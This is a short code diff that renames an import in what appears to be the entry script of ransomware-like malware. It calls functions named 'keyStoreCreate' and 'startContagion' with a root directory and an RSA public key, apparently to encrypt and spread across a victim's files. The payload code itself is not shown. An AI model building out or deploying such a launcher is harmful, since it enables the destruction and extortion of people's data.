@@ -1,5 +1,5 @@
 import starter
-import Utils 
+import utils 
 
-starter.keyStoreCreate(Utils.version, Utils.what_is_my_id)
-starter.startContagion(Utils.root_directory, Utils.rsa_public_key)
+starter.keyStoreCreate(utils.version, utils.what_is_my_id)
+starter.startContagion(utils.root_directory, utils.rsa_public_key)
